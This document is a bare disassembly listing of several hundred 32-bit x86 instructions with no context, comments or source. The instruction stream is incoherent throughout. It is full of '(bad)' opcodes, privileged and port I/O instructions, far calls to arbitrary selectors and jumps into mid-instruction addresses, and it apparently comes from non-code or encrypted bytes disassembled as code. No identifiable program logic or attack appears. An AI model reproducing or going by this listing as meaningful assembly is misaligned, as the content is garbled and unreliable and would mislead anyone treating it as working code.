  41f185:	push   ebp
  41f186:	daa    
  41f187:	dec    eax
  41f188:	(bad)
  41f18c:	pop    ebx
  41f18d:	addr16 mov ecx,0x891f2664
  41f193:	shl    BYTE PTR [edi+edx*8-0x1],0xca
  41f198:	repz hlt 
  41f19a:	sbb    al,0xfb
  41f19c:	fwait
  41f19d:	call   0xaa46b79e
  41f1a2:	iret   
  41f1a3:	fisub  WORD PTR [edi+eax*4]
  41f1a6:	mov    al,0xd3
  41f1a8:	adc    BYTE PTR [esi],0x17
  41f1ab:	outs   dx,BYTE PTR ds:[esi]
  41f1ac:	xchg   esp,eax
  41f1ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1ae:	aaa    
  41f1af:	in     al,0x51
  41f1b1:	ret    
  41f1b2:	mov    al,ds:0x3c32e1f3
  41f1b7:	mov    WORD PTR [esi],gs
  41f1b9:	loopne 0x41f1b7
  41f1bb:	std    
  41f1bc:	cwde   
  41f1bd:	jle    0x41f148
  41f1bf:	push   es
  41f1c0:	mov    ebx,0x65fe96c5
  41f1c5:	pop    ds
  41f1c6:	mov    ah,0x9a
  41f1c8:	or     BYTE PTR [edi+0x45],bh
  41f1cb:	out    0xaf,al
  41f1cd:	mov    bh,0x45
  41f1cf:	nop
  41f1d0:	jge    0x41f190
  41f1d2:	push   ebp
  41f1d3:	fiadd  WORD PTR [ebp-0x69]
  41f1d6:	add    DWORD PTR [edi+eiz*2+0x3ebef094],esp
  41f1dd:	xchg   DWORD PTR [esi+edx*8],ebx
  41f1e0:	sub    DWORD PTR ds:0x7119de27,ecx
  41f1e6:	sar    DWORD PTR [esi],0x95
  41f1e9:	scas   eax,DWORD PTR es:[edi]
  41f1ea:	cdq    
  41f1eb:	pusha  
  41f1ec:	fwait
  41f1ed:	adc    al,BYTE PTR [ecx]
  41f1ef:	inc    ebx
  41f1f0:	pop    ebx
  41f1f1:	loop   0x41f1bd
  41f1f3:	inc    esp
  41f1f4:	gs aaa 
  41f1f6:	scas   eax,DWORD PTR es:[edi]
  41f1f7:	pop    edi
  41f1f8:	out    0x7a,eax
  41f1fa:	adc    dh,BYTE PTR [esp+eax*8]
  41f1fd:	les    edi,FWORD PTR ds:0xe3d08f
  41f203:	mov    bl,0x1b
  41f205:	sbb    dl,BYTE PTR gs:[edi]
  41f208:	aam    0x9c
  41f20a:	jno    0x41f1c5
  41f20c:	mov    eax,0x120becff
  41f211:	addr16 and eax,0x7abd47db
  41f217:	retf   0xefc5
  41f21a:	rcr    edx,0x1
  41f21d:	cs push 0xc55cc217
  41f223:	mov    ebx,0x11e51a5c
  41f228:	or     esp,DWORD PTR [edx]
  41f22a:	(bad)  
  41f22b:	mov    esp,0xfb7655ab
  41f230:	std    
  41f231:	clc    
  41f232:	in     eax,0x8
  41f234:	mov    ebx,0x3cb3dc12
  41f239:	sbb    al,0xc7
  41f23b:	hlt    
  41f23c:	or     ch,BYTE PTR [ecx+0x6c]
  41f23f:	adc    bl,BYTE PTR [ebx+0x48b5c0da]
  41f245:	mov    dl,0x53
  41f247:	mov    eax,ds:0x6f9383
  41f24c:	push   ebp
  41f24d:	out    dx,eax
  41f24e:	cmp    DWORD PTR [ebp+0x56c0411c],edx
  41f254:	cdq    
  41f255:	into   
  41f256:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f257:	nop
  41f258:	push   ecx
  41f259:	xchg   ebx,eax
  41f25a:	ins    BYTE PTR es:[edi],dx
  41f25b:	add    DWORD PTR [ebp+0xd5f4bfb],eax
  41f261:	xlat   BYTE PTR cs:[ebx]
  41f263:	pop    edx
  41f264:	call   FWORD PTR [ebx+0x57a524ba]
  41f26a:	xor    ebp,esp
  41f26c:	(bad)  
  41f26d:	cmp    al,BYTE PTR [edx-0x62]
  41f270:	xor    eax,0x88cc8a46
  41f275:	(bad)  
  41f276:	jmp    0x41f2b4
  41f278:	fsub   QWORD PTR [edx+0x5f]
  41f27b:	mov    ecx,0x34734857
  41f280:	adc    al,0xe1
  41f282:	icebp  
  41f283:	mov    DWORD PTR [esi-0x2b],0x9ec69589
  41f28a:	jno    0x41f235
  41f28c:	imul   ecx,ecx,0x5
  41f28f:	outs   dx,DWORD PTR ds:[esi]
  41f290:	mov    cl,0xad
  41f292:	xchg   DWORD PTR [esi],eax
  41f294:	pop    edi
  41f295:	sbb    esi,ebp
  41f297:	add    al,0x97
  41f299:	cmp    ah,0x28
  41f29c:	dec    edi
  41f29d:	mov    cl,0x99
  41f29f:	xchg   ebx,eax
  41f2a0:	mov    ch,bh
  41f2a2:	dec    esp
  41f2a3:	and    DWORD PTR [ebx+0x3bfc1fe],ebp
  41f2a9:	mov    eax,edx
  41f2ab:	(bad)  
  41f2ac:	sbb    al,0x97
  41f2ae:	xchg   ecx,eax
  41f2af:	pop    es
  41f2b0:	fsub   st,st(7)
  41f2b2:	xor    DWORD PTR gs:[esi],0x4ee81ae5
  41f2b9:	and    eax,ebx
  41f2bb:	lahf   
  41f2bc:	cmp    al,dh
  41f2be:	cmc    
  41f2bf:	xchg   BYTE PTR [ebx-0x22],ch
  41f2c2:	mov    al,ds:0x32612357
  41f2c7:	(bad)  
  41f2c8:	aad    0xac
  41f2ca:	aas    
  41f2cb:	cli    
  41f2cc:	hlt    
  41f2cd:	fxtract 
  41f2cf:	gs cmp edx,esi
  41f2d2:	dec    ebp
  41f2d3:	dec    esi
  41f2d4:	cli    
  41f2d5:	cmp    al,0x1c
  41f2d7:	mov    DWORD PTR [ecx+0xc25153c],ecx
  41f2dd:	add    BYTE PTR [edi+0x4bda598],0xb1
  41f2e4:	test   BYTE PTR [ebx+0x66],al
  41f2e7:	out    0x28,al
  41f2e9:	mov    dl,0x92
  41f2eb:	addr16 cdq 
  41f2ed:	cmp    DWORD PTR [ecx-0x3d1148d2],ecx
  41f2f3:	push   0x17
  41f2f5:	clc    
  41f2f6:	(bad)  
  41f2f7:	cld    
  41f2f8:	xor    BYTE PTR [edx],cl
  41f2fa:	xor    DWORD PTR [ebx-0x63cfc21b],edx
  41f300:	je     0x41f364
  41f302:	mov    ebx,0x6350a7e2
  41f307:	je     0x41f311
  41f309:	xor    BYTE PTR [ecx+0x0],0x0
  41f30d:	scas   eax,DWORD PTR es:[edi]
  41f30e:	cli    
  41f30f:	inc    ebp
  41f310:	icebp  
  41f311:	mov    BYTE PTR [eax-0x1d],dh
  41f314:	xchg   esi,eax
  41f315:	push   cs
  41f316:	addr16 jge 0x41f2db
  41f319:	stc    
  41f31a:	pushf  
  41f31b:	ret    
  41f31c:	(bad)  
  41f31e:	add    BYTE PTR [eax],al
  41f320:	add    BYTE PTR [eax],al
  41f322:	sub    esp,DWORD PTR [ecx-0x934ebbd]
  41f328:	jg     0x41f2e9
  41f32a:	test   ch,ch
  41f32c:	out    dx,al
  41f32d:	or     BYTE PTR [ecx+0x6b],0x2
  41f331:	and    al,0x5
  41f333:	outs   dx,BYTE PTR ds:[esi]
  41f334:	add    DWORD PTR [eax],eax
  41f336:	hlt    
  41f337:	add    al,0x0
  41f339:	add    bh,ch
  41f33b:	xor    eax,0x1dd201c6
  41f340:	retf   0x7874
  41f343:	push   eax
  41f344:	lock jbe 0x41f37e
  41f347:	sahf   
  41f348:	call   0x9ab0:0xb3b42423
  41f34f:	call   0xa6c2:0xde56b386
  41f356:	jmp    0x41f35c
  41f358:	int    0x65
  41f35a:	stos   DWORD PTR es:[edi],eax
  41f35b:	adc    dh,BYTE PTR [edi]
  41f35d:	sub    DWORD PTR cs:[edi+0x72],ebx
  41f361:	ss pop es
  41f363:	fsubr  DWORD PTR [esi-0x2e]
  41f366:	push   es
  41f367:	int    0x36
  41f369:	fstp   QWORD PTR [esi]
  41f36b:	cwde   
  41f36c:	in     al,dx
  41f36d:	ja     0x41f2f6
  41f36f:	jo     0x41f383
  41f371:	cwde   
  41f372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f373:	xchg   esp,eax
  41f374:	mov    ds:0x2435def9,al
  41f379:	mov    cl,0xaa
  41f37b:	mov    ah,0xa2
  41f37d:	inc    esi
  41f37e:	dec    edx
  41f37f:	and    ch,BYTE PTR [esi+0x3883f799]
  41f385:	and    BYTE PTR [ebp-0x30],cl
  41f388:	sahf   
  41f389:	mov    cl,0x2
  41f38b:	ja     0x41f32c
  41f38d:	sub    al,0xb9
  41f38f:	mov    bl,BYTE PTR [edx-0x74]
  41f392:	icebp  
  41f393:	jne    0x41f362
  41f395:	ins    DWORD PTR es:[edi],dx
  41f396:	adc    esp,DWORD PTR [edi+edi*1]
  41f399:	mov    bh,0xb7
  41f39b:	std    
  41f39c:	jno    0x41f3ed
  41f39e:	pop    ds
  41f39f:	mov    edx,0x7a8b8eec
  41f3a4:	loop   0x41f38e
  41f3a6:	addr16 xchg ecx,eax
  41f3a8:	inc    ebx
  41f3a9:	sbb    DWORD PTR [ebx-0x9],esp
  41f3ac:	and    DWORD PTR [eax+0x4df0ea85],0x9044c844
  41f3b6:	loopne 0x41f3c8
  41f3b8:	(bad)  
  41f3b9:	jne    0x41f3bb
  41f3bb:	sbb    eax,0xe1bf10d0
  41f3c0:	cmp    edx,0x7636b13f
  41f3c6:	add    DWORD PTR [esi+0x5c7dcdb0],0xffffff99
  41f3cd:	int3   
  41f3ce:	xchg   edi,eax
  41f3cf:	clc    
  41f3d0:	repnz mov bl,0x55
  41f3d3:	jbe    0x41f391
  41f3d5:	hlt    
  41f3d6:	inc    edi
  41f3d7:	sbb    ch,bl
  41f3d9:	sub    eax,0xc981ff2c
  41f3de:	fwait
  41f3df:	test   al,0x4
  41f3e1:	and    al,0x83
  41f3e3:	xchg   esi,eax
  41f3e4:	xor    ebx,DWORD PTR [ebx+0x6bd2856f]
  41f3ea:	or     esp,DWORD PTR [ebp+0x3758fbc]
  41f3f0:	and    DWORD PTR [edx],edi
  41f3f2:	jne    0x41f3fa
  41f3f4:	mov    ecx,0xfea1ed7a
  41f3f9:	and    al,dl
  41f3fb:	xchg   esp,eax
  41f3fc:	inc    edi
  41f3fd:	jge    0x41f420
  41f3ff:	call   0x16a1bfb1
  41f404:	sbb    DWORD PTR [ebp-0x4c],ebp
  41f407:	pop    ss
  41f408:	shl    bl,cl
  41f40a:	in     al,dx
  41f40b:	das    
  41f40c:	xlat   BYTE PTR ds:[ebx]
  41f40d:	(bad)  
  41f40e:	jmp    0x41d6:0xbb504ed7
  41f415:	xor    BYTE PTR [esi],0xe0
  41f418:	mov    ds:0xff6388a6,al
  41f41d:	(bad)  
  41f41e:	cmp    DWORD PTR [ebx],ebp
  41f420:	jmp    0x7ef1903c
  41f425:	and    al,0xbb
  41f427:	mov    edx,0xeed0460b
  41f42c:	call   0x629d:0xe508079
  41f433:	lahf   
  41f434:	or     DWORD PTR [ecx],ebp
  41f436:	push   ebp
  41f437:	test   edi,esp
  41f439:	mov    ah,0x13
  41f43b:	push   0x71f46d8f
  41f440:	mov    esp,0xc95e0a3f
  41f445:	(bad)  
  41f446:	xchg   ebx,eax
  41f447:	adc    al,0xec
  41f449:	test   DWORD PTR [edx+edi*1],0xc18cb400
  41f450:	std    
  41f451:	std    
  41f452:	add    DWORD PTR [edi+eiz*2-0x45],esi
  41f456:	jo     0xbdda3e0b
  41f45c:	not    DWORD PTR [edx-0xc]
  41f45f:	nop
  41f460:	mov    dh,0x61
  41f462:	mov    al,ds:0x8376cf4f
  41f467:	mov    esi,DWORD PTR [ecx]
  41f469:	sbb    eax,0xc48a51d2
  41f46e:	repnz dec ebp
  41f470:	mov    al,ds:0xca398386
  41f475:	loope  0x41f47f
  41f477:	xor    al,0x2c
  41f479:	nop
  41f47a:	sbb    ebx,ebp
  41f47c:	ficom  WORD PTR [esp+ebp*1]
  41f47f:	imul   DWORD PTR [esi+0x76]
  41f482:	xlat   BYTE PTR ds:[ebx]
  41f483:	sub    BYTE PTR [ebx-0x32f3299d],0x45
  41f48a:	dec    eax
  41f48b:	das    
  41f48c:	and    edi,eax
  41f48e:	and    cl,BYTE PTR [esi+0x1a]
  41f491:	outs   dx,BYTE PTR ds:[esi]
  41f492:	mov    al,ds:0x589b81a2
  41f497:	xor    DWORD PTR [ebx+ebx*4+0x65],ebx
  41f49b:	iret   
  41f49c:	in     al,0x90
  41f49e:	mov    ebx,0x9552a2c3
  41f4a3:	cmp    dh,0xf7
  41f4a6:	mov    bl,0x2a
  41f4a8:	or     ecx,DWORD PTR [ebx-0x7c]
  41f4ab:	(bad)  [edx]
  41f4ad:	cmc    
  41f4ae:	push   eax
  41f4af:	jns    0x41f48c
  41f4b1:	mov    eax,ds:0x4ccad41e
  41f4b6:	cwde   
  41f4b7:	adc    BYTE PTR [ebx-0x71],bh
  41f4ba:	sub    dh,BYTE PTR [edx-0x55]
  41f4bd:	ja     0x41f4af
  41f4bf:	pushf  
  41f4c0:	mov    esi,gs
  41f4c2:	ins    DWORD PTR es:[edi],dx
  41f4c3:	inc    ecx
  41f4c4:	push   eax
  41f4c5:	cwde   
  41f4c6:	jno    0x41f4a5
  41f4c8:	mov    dh,0x41
  41f4ca:	xor    ah,BYTE PTR [edx+0x11]
  41f4cd:	jno    0x41f4ce
  41f4cf:	ins    DWORD PTR es:[edi],dx
  41f4d0:	mov    al,0xf5
  41f4d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4d3:	loope  0x41f467
  41f4d5:	jb     0x41f4e3
  41f4d7:	loope  0x41f4ea
  41f4d9:	ret    0x2396
  41f4dc:	(bad)  
  41f4dd:	jno    0x41f556
  41f4df:	cmp    ebx,ebx
  41f4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4e3:	add    DWORD PTR [edx+edx*8+0x72],edi
  41f4e7:	mov    edx,eax
  41f4e9:	or     eax,0xe4fc6682
  41f4ee:	mov    ecx,0x31ce8e3f
  41f4f3:	mov    ch,0x8
  41f4f5:	inc    ebp
  41f4f6:	imul   esi,DWORD PTR ds:[ebx],0x22
  41f4fa:	frstor [esi]
  41f4fc:	sbb    ch,BYTE PTR [edx]
  41f4fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4ff:	mov    esp,0x92b40b54
  41f504:	xchg   ebp,eax
  41f505:	mov    cl,BYTE PTR fs:[ebp+0x37]
  41f509:	adc    BYTE PTR [eax+eax*1+0x4970d9e7],cl
  41f510:	mov    dh,0x33
  41f512:	adc    eax,0xfbda7657
  41f517:	xchg   ebp,eax
  41f518:	loop   0x41f53c
  41f51a:	adc    BYTE PTR [ecx-0x62],ah
  41f51d:	mov    al,0xae
  41f51f:	into   
  41f520:	jno    0x41f59a
  41f522:	sti    
  41f523:	lods   al,BYTE PTR ds:[esi]
  41f524:	xlat   BYTE PTR ds:[ebx]
  41f525:	push   ds
  41f526:	je     0x41f4e0
  41f528:	ficomp DWORD PTR [esi]
  41f52a:	shl    BYTE PTR [eax],0xac
  41f52d:	cmp    edx,DWORD PTR [ecx+0x26418cb0]
  41f533:	fmulp  st(5),st
  41f535:	add    dl,bl
  41f537:	les    edx,FWORD PTR [edi+0x8cc4cee]
  41f53d:	nop
  41f53e:	add    al,0x33
  41f540:	sub    al,0xfd
  41f542:	ret    
  41f543:	enter  0xd0e6,0xf3
  41f547:	cld    
  41f548:	out    0x45,al
  41f54a:	ss mov eax,0x57420778
  41f550:	(bad)  
  41f551:	into   
  41f552:	cld    
  41f553:	sub    al,0xd4
  41f555:	retf   
  41f556:	ins    DWORD PTR es:[edi],dx
  41f557:	cli    
  41f558:	loopne 0x41f58f
  41f55a:	fnsave [ebx-0x6e]
  41f55d:	sub    dh,al
  41f55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f560:	call   0x9977:0x60a3392a
  41f567:	jne    0x41f52b
  41f569:	aas    
  41f56a:	xchg   ecx,eax
  41f56b:	(bad)  
  41f56c:	adc    bl,BYTE PTR [ebp+0x79]
  41f56f:	sbb    ebp,DWORD PTR ds:0x573db5e4
  41f575:	cmp    DWORD PTR [esi],esp
  41f577:	stos   BYTE PTR es:[edi],al
  41f578:	mov    esp,0x40f83037
  41f57d:	pop    ecx
  41f57e:	in     al,0xe9
  41f580:	mul    DWORD PTR [ebx+eiz*2+0x5c]
  41f584:	stos   DWORD PTR es:[edi],eax
  41f585:	cmp    dl,BYTE PTR [ebp-0x6e]
  41f588:	adc    BYTE PTR gs:[ecx],cl
  41f58b:	and    ebp,DWORD PTR [eax-0x16]
  41f58e:	test   BYTE PTR [edi+0x15],0xa6
  41f592:	mov    ch,0x95
  41f594:	in     eax,dx
  41f595:	xchg   ebx,eax
  41f596:	or     al,0x49
  41f598:	lods   eax,DWORD PTR ds:[esi]
  41f599:	loopne 0x41f593
  41f59b:	sbb    cl,BYTE PTR [ebx-0x609bf163]
  41f5a1:	ja     0x41f576
  41f5a3:	push   ebx
  41f5a4:	into   
  41f5a5:	xchg   ecx,eax
  41f5a6:	mov    esp,0xe41611f3
  41f5ab:	mov    al,BYTE PTR [edi]
  41f5ad:	mov    eax,ds:0xfb37f96
  41f5b2:	push   0xfffffff4
  41f5b4:	call   0x728cb95d
  41f5b9:	dec    edx
  41f5ba:	test   eax,0x537b7609
  41f5bf:	xchg   ebp,eax
  41f5c0:	xchg   edi,eax
  41f5c1:	xchg   esp,esp
  41f5c3:	in     eax,0xdd
  41f5c5:	rcl    DWORD PTR [eax-0xc],0x95
  41f5c9:	or     ch,BYTE PTR [edx+0x3b]
  41f5cc:	or     al,0x25
  41f5ce:	mov    eax,ds:0xca92f4f
  41f5d3:	sbb    eax,0x738a0469
  41f5d8:	push   0x52
  41f5da:	out    0x97,al
  41f5dc:	dec    eax
  41f5dd:	fild   DWORD PTR [ecx]
  41f5df:	mov    al,ds:0xe9fce5cc
  41f5e4:	(bad)  
  41f5e5:	std    
  41f5e6:	jecxz  0x41f663
  41f5e8:	lds    esi,FWORD PTR [ecx-0x12]
  41f5eb:	adc    al,0x33
  41f5ed:	mov    bh,0x1e
  41f5ef:	sbb    al,0x9f
  41f5f1:	ror    DWORD PTR [ebp+0x5],cl
  41f5f4:	(bad)  
  41f5f5:	sbb    esp,edx
  41f5f7:	inc    ecx
  41f5f8:	test   BYTE PTR [esi-0x14],ah
  41f5fb:	sahf   
  41f5fc:	mov    ?,WORD PTR [ecx-0xd05a7be]
  41f602:	jne    0x41f666
  41f604:	mov    eax,0x14869557
  41f609:	jl     0x41f625
  41f60b:	repnz fwait
  41f60d:	adc    bl,BYTE PTR [eax-0x364ddcb4]
  41f613:	dec    edx
  41f614:	sahf   
  41f615:	scas   al,BYTE PTR es:[edi]
  41f616:	sub    eax,0xc908bbe3
  41f61b:	adc    BYTE PTR [esp+ecx*8-0x6225dc7d],dh
  41f622:	xchg   esi,eax
  41f623:	out    0xe8,al
  41f625:	xor    bl,BYTE PTR [eax-0x58]
  41f628:	les    ecx,FWORD PTR [esp+edx*4]
  41f62b:	jg     0x41f690
  41f62d:	lahf   
  41f62e:	mov    cl,0xd5
  41f630:	dec    ebp
  41f631:	inc    ecx
  41f632:	(bad)  
  41f633:	jns    0x41f6a2
  41f635:	pop    ds
  41f636:	mov    BYTE PTR [ebp+0x41],0x76
  41f63a:	aaa    
  41f63b:	xchg   esp,eax
  41f63c:	and    DWORD PTR [ebx-0x61],0x50
  41f640:	in     al,dx
  41f641:	test   al,0x3
  41f643:	dec    ecx
  41f644:	out    dx,al
  41f645:	pop    esp
  41f646:	sar    DWORD PTR [eax],0x6c
  41f649:	jg     0x41f5f9
  41f64b:	cmp    BYTE PTR [ebx+esi*2+0x152a87b3],ch
  41f652:	add    al,0xb0
  41f654:	pop    ebx
  41f655:	xchg   edi,eax
  41f656:	sbb    al,0xd4
  41f658:	and    eax,0x384366fd
  41f65d:	push   eax
  41f65e:	scas   eax,DWORD PTR es:[edi]
  41f65f:	retf   0x4c1b
  41f662:	ror    DWORD PTR [ecx-0x16],cl
  41f665:	xor    bh,BYTE PTR [edx+0x7a7501b5]
  41f66b:	sub    BYTE PTR [eiz*2-0x2ce1d62d],dl
  41f672:	data16 or bh,BYTE PTR [ecx-0x388efb91]
  41f679:	(bad)  
  41f67a:	aad    0xd1
  41f67c:	shl    DWORD PTR [ebx-0xc762a02],0x47
  41f683:	sbb    cl,BYTE PTR [ecx]
  41f685:	push   ss
  41f686:	pop    ebp
  41f687:	es pop ebx
  41f68a:	jl     0x41f639
  41f68c:	pop    ebp
  41f68d:	xchg   ebx,eax
  41f68e:	fld    QWORD PTR [ebx+ecx*4]
  41f691:	xchg   edx,eax
  41f692:	data16 hlt 
  41f694:	retf   0x3fcf
  41f697:	add    al,0x9e
  41f699:	jmp    0x22407b64
  41f69e:	fbld   TBYTE PTR [ecx]
  41f6a0:	jne    0x41f68f
  41f6a2:	add    BYTE PTR [esi],ah
  41f6a4:	test   BYTE PTR [edx+0xc],bl
  41f6a7:	retf   
  41f6a8:	cdq    
  41f6a9:	push   ecx
  41f6aa:	xor    DWORD PTR [eax+esi*2-0x3a31ea95],edx
  41f6b1:	cmp    DWORD PTR ds:0x32b3da83,ebx
  41f6b7:	xor    al,0x13
  41f6b9:	nop
  41f6ba:	xor    al,0x62
  41f6bc:	cs sbb ebp,ecx
  41f6bf:	jns    0x41f6a8
  41f6c1:	cmp    ecx,DWORD PTR cs:[si+0x5717]
  41f6c7:	in     al,dx
  41f6c8:	xor    ebp,DWORD PTR [ecx+0x6]
  41f6cb:	or     BYTE PTR [esi+0x63d983e2],dh
  41f6d1:	or     esi,edx
  41f6d3:	jmp    0x41f69f
  41f6d5:	outs   dx,BYTE PTR ds:[esi]
  41f6d6:	fisub  WORD PTR [bx+di]
  41f6d9:	fst    QWORD PTR [edi-0x50]
  41f6dc:	fisttp WORD PTR ds:0x6c3fdd2e
  41f6e2:	icebp  
  41f6e3:	jae    0x41f68a
  41f6e5:	sbb    DWORD PTR [edx-0x7f],eax
  41f6e8:	dec    eax
  41f6e9:	leave  
  41f6ea:	mov    al,0xbb
  41f6ec:	retf   0x126f
  41f6ef:	test   eax,0xb3bcf14d
  41f6f4:	aad    0xea
  41f6f6:	inc    eax
  41f6f7:	xor    edi,ecx
  41f6f9:	shl    BYTE PTR [eax-0x4e],1
  41f6fc:	and    ebp,DWORD PTR [eax-0x61]
  41f6ff:	push   0xbc31ec2b
  41f704:	out    dx,al
  41f705:	mov    eax,ds:0xd1dc6b84
  41f70a:	imul   ebx,DWORD PTR [edx-0x15],0x40
  41f70e:	sar    ebx,cl
  41f710:	aaa    
  41f711:	push   0xffffffc3
  41f713:	pushf  
  41f714:	jo     0x41f76c
  41f716:	outs   dx,DWORD PTR ds:[esi]
  41f717:	in     al,dx
  41f718:	mov    bl,0xc2
  41f71a:	mov    ebp,0xa243a1dc
  41f71f:	or     dh,bl
  41f721:	icebp  
  41f722:	xrelease xchg BYTE PTR [ecx+eiz*8-0x48af7de5],bh
  41f72a:	xor    bl,BYTE PTR [edx+eiz*1]
  41f72d:	test   eax,0xfcc182e1
  41f732:	rcl    ebp,0x51
  41f735:	cmp    DWORD PTR [ebp-0x23],eax
  41f738:	xor    BYTE PTR [ecx-0x288977b2],0xcc
  41f73f:	fld    QWORD PTR [edi+0x68c65794]
  41f745:	(bad)  
  41f746:	push   eax
  41f747:	pop    ss
  41f748:	or     DWORD PTR [eax],eax
  41f74a:	sub    ch,ch
  41f74c:	adc    cl,al
  41f74e:	xor    al,0xc1
  41f750:	popa   
  41f751:	mov    al,ds:0x368bbe79
  41f756:	out    0x65,al
  41f758:	hlt    
  41f759:	xchg   ebx,eax
  41f75a:	mov    ecx,edx
  41f75c:	dec    edi
  41f75d:	popf   
  41f75e:	(bad)  
  41f75f:	ucomiss xmm5,DWORD PTR [ecx]
  41f762:	xor    esp,0x1b0ad195
  41f768:	or     esi,esp
  41f76a:	mov    cl,0x4b
  41f76c:	mov    esi,0xb0fad2d1
  41f771:	mov    cl,0x2d
  41f773:	inc    edi
  41f774:	jo     0x41f79c
  41f776:	push   esi
  41f777:	pop    ecx
  41f778:	aam    0xa7
  41f77a:	lods   al,BYTE PTR ds:[esi]
  41f77b:	ret    
  41f77c:	es mov cl,0x6
  41f77f:	sar    ebp,0x8c
  41f782:	adc    DWORD PTR [ecx+0xf7fcb65],0x8c4ea205
  41f78c:	push   ss
  41f78d:	push   esp
  41f78e:	add    al,0xd1
  41f790:	inc    esi
  41f791:	inc    DWORD PTR [eax-0x11]
  41f794:	je     0x41f72a
  41f796:	rol    ch,1
  41f798:	ret    0x80e9
  41f79b:	call   0xcb7a:0x92a24f55
  41f7a2:	inc    ecx
  41f7a3:	add    ebx,edi
  41f7a5:	dec    ebp
  41f7a6:	aam    0x32
  41f7a8:	retf   0x8027
  41f7ab:	div    DWORD PTR [eax+ecx*1-0x1b]
  41f7af:	adc    al,0xdc
  41f7b1:	in     al,0xfc
  41f7b3:	pop    ebx
  41f7b4:	adc    esp,eax
  41f7b6:	pusha  
  41f7b7:	add    bl,dl
  41f7b9:	mov    al,0x84
  41f7bb:	xchg   esp,eax
  41f7bc:	sub    ebx,ebx
  41f7be:	jne    0x41f764
  41f7c0:	jno    0x41f7f7
  41f7c2:	retf   
  41f7c3:	inc    eax
  41f7c4:	xor    bh,BYTE PTR [esi-0x5e]
  41f7c7:	out    0x13,eax
  41f7c9:	mov    ebx,edi
  41f7cb:	lea    ebx,[esi+0x63]
  41f7ce:	sub    dh,BYTE PTR [ebp+0x1e326a07]
  41f7d4:	sbb    eax,0x8003ade6
  41f7d9:	retf   
  41f7da:	jae    0x41f807
  41f7dc:	jmp    0x41f7bd
  41f7de:	les    ebx,FWORD PTR [edi+0x7cac5cc6]
  41f7e4:	mov    cl,0xf2
  41f7e6:	mov    ch,0xd4
  41f7e8:	call   0x5a516b14
  41f7ed:	jb     0x41f7e5
  41f7ef:	pop    esp
  41f7f0:	pop    edx
  41f7f1:	and    eax,0x40
  41f7f4:	push   esp
  41f7f5:	std    
  41f7f6:	pop    esp
  41f7f7:	aam    0x6a
  41f7f9:	and    DWORD PTR [ecx+edi*8+0x5b4402d9],ebp
  41f800:	jp     0x41f84e
  41f802:	jnp    0x41f878
  41f804:	sbb    cl,bh
  41f806:	lods   eax,DWORD PTR ds:[esi]
  41f807:	mov    ebp,0xe101bf17
  41f80c:	cdq    
  41f80d:	dec    ebx
  41f80e:	mov    bl,0x9e
  41f810:	push   edi
  41f811:	dec    ecx
  41f812:	stos   BYTE PTR es:[edi],al
  41f813:	sbb    dh,0x6e
  41f816:	dec    ecx
  41f817:	jmp    0x3d7b183a
  41f81c:	pusha  
  41f81d:	jp     0x41f830
  41f81f:	cmp    ebp,ebx
  41f821:	fisub  DWORD PTR [ebp-0x23779b10]
  41f827:	cmc    
  41f828:	mov    ds:0x9b0000cb,al
  41f82d:	jp     0x41f82f
  41f82f:	add    BYTE PTR [eax],al
  41f831:	add    BYTE PTR [eax+0x64],cl
  41f834:	mul    BYTE PTR [eax-0x2]
  41f837:	repnz fisubr WORD PTR [ecx+eiz*8-0x64]
  41f83c:	out    0x52,eax
  41f83e:	push   eax
  41f83f:	cmp    DWORD PTR [ebp+0x172f91c],esp
  41f845:	add    ah,dh
  41f847:	add    al,0x0
  41f849:	add    BYTE PTR [esi-0x2709e253],ah
  41f84f:	fcomip st,st(1)
  41f851:	call   0xffc6:0x7a561166
  41f858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f859:	mov    ?,WORD PTR [edx]
  41f85b:	xor    esp,DWORD PTR [eax+esi*2-0x75766c02]
  41f862:	test   DWORD PTR [ecx-0x7f],0x419fa456
  41f869:	jnp    0x41f81d
  41f86b:	dec    ebp
  41f86c:	mov    ecx,0xc93425bd
  41f871:	inc    edx
  41f872:	and    ebp,DWORD PTR [edx+0x15]
  41f875:	call   0x9a36:0x6a31be45
  41f87c:	mov    al,0x69
  41f87e:	jne    0x41f8fb
  41f880:	test   BYTE PTR [esp+edi*1-0x31],0xe9
  41f885:	adc    DWORD PTR [edx+0x17],0xffffffc7
  41f889:	das    
  41f88a:	jno    0x41f889
  41f88c:	imul   esp,DWORD PTR ds:0xc9655f68,0xffffffed
  41f893:	or     edi,DWORD PTR [ecx]
  41f895:	mov    ebx,0xe6b95001
  41f89a:	mov    bh,0xaa
  41f89c:	es loop 0x41f900
  41f89f:	jbe    0x41f873
  41f8a1:	adc    eax,0x3ad253d2
  41f8a6:	ss hlt 
  41f8a8:	sar    DWORD PTR [ebp-0x63eb46d6],0xfd
  41f8af:	and    BYTE PTR [eax+0x17282351],ch
  41f8b5:	mov    ecx,0x5fdfdc20
  41f8ba:	cwde   
  41f8bb:	pop    ds
  41f8bc:	(bad)  
  41f8bd:	rcl    BYTE PTR [ebx+0x17feb3be],0xb0
  41f8c4:	dec    edx
  41f8c5:	and    eax,0x553bc2a1
  41f8ca:	inc    ebx
  41f8cb:	xor    esi,esi
  41f8cd:	push   esi
  41f8ce:	out    dx,eax
  41f8cf:	loopne 0x41f89e
  41f8d1:	and    eax,0xe745e774
  41f8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8d7:	xlat   BYTE PTR ds:[ebx]
  41f8d8:	(bad)  
  41f8da:	iret   
  41f8db:	adc    esp,DWORD PTR [ebx+0x44c8ce6d]
  41f8e1:	popa   
  41f8e2:	pop    ss
  41f8e3:	mov    ch,0x6f
  41f8e5:	or     esi,DWORD PTR [ebx-0x4f]
  41f8e8:	repz inc esp
  41f8ea:	add    eax,DWORD PTR [edx+0x37edc3a1]
  41f8f0:	sbb    al,0x0
  41f8f2:	add    dh,BYTE PTR [esi-0x3]
  41f8f5:	neg    dl
  41f8f7:	adc    BYTE PTR [esi+0x70b94238],ch
  41f8fd:	call   0xecde2c18
  41f902:	mov    fs,WORD PTR [eax+0x4c]
